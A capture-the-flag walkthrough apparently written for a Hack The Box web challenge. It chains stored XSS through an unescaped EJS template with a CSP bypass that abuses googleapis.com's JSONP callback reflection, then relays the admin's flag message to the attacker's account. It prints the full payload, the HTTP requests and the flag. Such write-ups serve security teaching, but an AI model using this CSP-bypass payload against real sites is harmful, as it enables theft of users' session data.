# MassaGold - HTB CTF Walkthrough

| Field | Value |
|---|---|
| Challenge type | Web application |
| Tech stack | nginx -> Express/EJS backend, sqlite3, bcrypt, Playwright (Firefox) admin bot |
| Flag location | Message id 1 (admin's inbox, seeded at boot) |
| Vulnerability chain | Stored XSS (unescaped EJS output) -> CSP bypass via Google JSONP reflection quirk -> same-origin self-exfil |
| Flag | `HTB{m3554g3_1n_7h3_cu570dy_ch41n_e66d4a03579361e56637079a61aca72f}` |

---

## Overview - How The App Works

```
[You] --> nginx (public)
               |
               +-- Express/EJS backend (internal)
                        |
                        +-- sqlite3 (users, messages)
                        +-- Playwright/Firefox "admin bot"
```

A small letter/messaging app. Any registered user can message any other registered user by
username. Whenever a message is sent **to** the user `admin`, the app immediately queues a
headless Firefox bot (already logged in as admin) to visit that exact message:

```js
// app/controllers/messageController.js
if (recipient.username === 'admin') {
  enqueueMessageVisit(result.lastID);
}
```

Six users are seeded at boot (`entrypoint.js`), including `archivist`, who sends `admin` the
very first message in the database - the "sealed royal record" letter containing the flag. The
challenge lore ("steal the first false letter... bring it to Damas") is a direct pointer at
**message id 1**.

---

## Bug 1 - Stored XSS via Unescaped EJS Output

**File:** `app/views/message.ejs`

```ejs
<pre class="letter-copy"><%- message.content %></pre>
```

EJS's `<%- %>` renders raw, unescaped HTML (as opposed to `<%= %>`, used everywhere else in this
app, which HTML-entity-escapes). `message.content` is the free-text body of any message,
entirely attacker-controlled. Since the admin bot renders this exact template when it visits a
message we sent it, anything we put in `content` executes in admin's authenticated browser
session.

---

## Bug 2 - CSP Bypass via Google's JSONP Reflection Quirk

**File:** `app/server.js`

```js
res.setHeader('Content-Security-Policy', [
  "default-src 'self'",
  "script-src 'self' https://www.googleapis.com",
  "style-src 'self'",
  "img-src 'self' data:",
  "font-src 'self' data:",
  "connect-src 'self'",
  "object-src 'none'",
  "form-action 'self'",
  "frame-ancestors 'none'"
].join('; '));
```

No `unsafe-inline`, no `unsafe-eval`, no nonce. Confirmed empirically with a real Firefox instance
(via Playwright) that a plain `<script>alert(1)</script>` and an inline `onerror=` handler are
both blocked outright by CSP - `script-src-elem` and `script-src-attr` violations respectively, no
dialog fires.

`https://www.googleapis.com` is explicitly allowed in `script-src`. That whitelist is normally
there to enable the classic "JSONP callback injection" CSP bypass: load a JSONP endpoint on the
trusted domain with `callback=<payload>`, and the payload becomes the function name that gets
"called" with the JSON body as its argument.

### Why the naive version fails

```
GET https://www.googleapis.com/customsearch/v1?q=x&callback=alert(1)//
```

Google validates the callback name server-side (`only alphabet, number, '_', '$', '.', '[' and
']' are allowed`) and rejects parens, returning a 400. But the response still reflects the raw,
*invalid* callback text verbatim as the leading JS in the body:

```js
// API callback
alert(1)//({
  "error": {
    "code": 400,
    ...
  }
}
);
```

A `<script src="...">` tag executes this whole file as one compilation unit. `//` only comments
out the rest of *that one line* - the multi-line JSON block below it (`"error": {`) is not valid
top-level JavaScript, so the entire script fails to parse. Because JS parses a script in full
before executing any of it, a syntax error anywhere means **nothing** in the file runs, not even
`alert(1)` earlier in the file. Confirmed directly with Playwright: the request returns 200, but a
`pageerror` fires (`unexpected token: ':'`) and no dialog appears.

### The actual bypass

End the callback with `;a=` instead of a comment. Google's fixed JSON tail then parses as a
harmless assignment instead of a syntax error:

```
callback=alert(1);a=
```
becomes:
```js
alert(1);a=({
  "error": { ... }
}
);
```
which is exactly:
```js
alert(1);
a = ({ "error": { ... } });
```
Two syntactically valid statements. Confirmed with Playwright: `RESPONSE: 200 ...`, `DIALOG: 1` -
the alert genuinely fires, loaded entirely from a CSP-whitelisted origin.

### Gotcha - Google mangles `<`, `>`, and backslash in the reflection

Diffing input against raw output showed the server passes the callback text through what looks
like a JSON-string escaper before reflecting it as bare code: `<` becomes `<`, `>` becomes
`>`, and a literal backslash `\` is doubled to `\\`. This silently breaks:

- Arrow functions (`r=>r.text()` becomes `r=>r.text()` - invalid outside a string/identifier
  context, throws `invalid escape sequence` in Firefox)
- Regex escapes like `\{`/`\}` (become `\\{`/`\\}`, changing their meaning)

**Fix:** avoid `<`, `>`, and `\` entirely in the payload. Use `function(){}` instead of arrow
functions, and `indexOf`/`substring` instead of a regex with escaped braces.

---

## Bug 3 (design, not a bug per se) - Self-Exfil Instead of External Callback

`connect-src 'self'` and `form-action 'self'` block exfiltrating to an external collaborator
domain, and `img-src`/`style-src` don't allow external hosts either. No external channel exists at
all. But the app's own message-sending feature is a perfectly good same-origin exfil channel:
have the injected script, running as admin, `fetch()` the flag message and then `fetch()`
`POST /messages` targeting **our own** username with the stolen content as the body. No CSP
directive blocks a same-origin fetch. This also matches the challenge's own lore almost exactly -
the stolen letter is delivered back through the harbor's own post system.

---

## Full Exploit Chain

```
1. Register any account (e.g. "pentest_1234").
2. Send a message to "admin" with content = the payload below.
3. App detects recipient == admin, queues the bot.
4. Admin bot (Playwright/Firefox, already logged in as admin) visits /messages/<our-new-id>.
5. CSP-whitelisted <script src="https://www.googleapis.com/..."> loads and executes as admin:
     - fetch('/messages/1')                      <- the seeded flag letter
     - extract "HTB{...}" via indexOf/substring
     - fetch('/messages', POST) to our own username with the flag as content
6. Check our own inbox - a new "message from admin" contains the flag.
```

---

## Payload

```html
<script src="https://www.googleapis.com/customsearch/v1?q=x&callback=fetch('/messages/1').then(function(r){return r.text();}).then(function(t){var i=t.indexOf('HTB{');var j=t.indexOf('}',i);var f=t.substring(i,j+1);return fetch('/messages',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'to_username=YOUR_USERNAME&content='+encodeURIComponent(f)});});a="></script>
```

Replace `YOUR_USERNAME` with the attacker account's own username, then URL-percent-encode the
entire `callback=...` value before placing it in the `src` attribute (the raw JS above contains
characters - spaces, quotes, braces, `+` - that must be percent-encoded in the query string).

---

## Step-by-Step HTTP Requests

### Step 1 - Register

```http
POST /register HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

username=pentest_1234&password=Passw0rd!123
```

### Step 2 - Send the payload to admin

```http
POST /messages HTTP/1.1
Host: <target>
Cookie: connect.sid=<session>
Content-Type: application/x-www-form-urlencoded

to_username=admin&content=<script src="https://www.googleapis.com/customsearch/v1?q=x&callback=fetch('/messages/1').then(function(r){return r.text();}).then(function(t){var i=t.indexOf('HTB{');var j=t.indexOf('}',i);var f=t.substring(i,j+1);return fetch('/messages',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'to_username=pentest_1234%26content='%2BencodeURIComponent(f)});});a="></script>
```

(Actual request body must have the payload's own special characters urlencoded a second time by
whatever HTTP client sends the form post - `curl --data-urlencode` handles this correctly.)

### Step 3 - Wait a few seconds, then check your own inbox

```http
GET / HTTP/1.1
Host: <target>
Cookie: connect.sid=<session>
```

A new message "from admin" appears. Open it:

```http
GET /messages/<id> HTTP/1.1
Host: <target>
Cookie: connect.sid=<session>
```

The `letter-copy` `<pre>` contains the flag.

---

## Verifying Locally First

The challenge zip ships full source and a `docker-compose.yml`. The whole chain was confirmed
offline (flag.txt in the source is a template value) before touching the live instance:

```bash
cd challenge/challenge
docker-compose up -d --build
# register + send payload + check inbox via curl, as above
# -> HTB{f4k3_fl4g_f0r_t3st1ng}
```

Same requests against the live HTB instance returned the real flag on the first attempt.

---

## Key Takeaways

| Concept | Detail |
|---|---|
| `<%- %>` vs `<%= %>` in EJS | The dash variant renders raw HTML - any attacker-controlled field passed through it is a stored XSS sink |
| Admin bot pattern | A background headless browser visiting attacker-supplied content while authenticated is the standard "steal from the admin" primitive - identify what it visits and what it can read |
| CSP allowlist entries need testing, not assuming | `googleapis.com` in `script-src` looks like the classic JSONP bypass, but Google patched raw code injection years ago - verify current behavior empirically instead of assuming a known technique still works |
| Full-file parse-before-execute | A `<script src>` is compiled as one unit; a syntax error anywhere in it prevents anything in it from running, even code that appears earlier and would otherwise be valid on its own |
| Turn the "leftover" tail into an assignment, not a comment | When forced to append attacker-uncontrolled trailing content, wrapping it in an assignment expression (`a=(...)`) is more robust than trying to comment it out, especially across multiple lines |
| Watch for silent server-side re-escaping | Google's endpoint quietly rewrites `<`, `>`, and `\` in the reflected text - always diff exact input vs exact output when building an injection payload instead of assuming verbatim reflection |
| Self-exfil when there's no external channel | A strict `connect-src`/`form-action 'self'` with no external image/style channel doesn't mean data can't leave the victim's session - the app's own authenticated write endpoints can be repurposed to relay stolen data back to the attacker's own account |
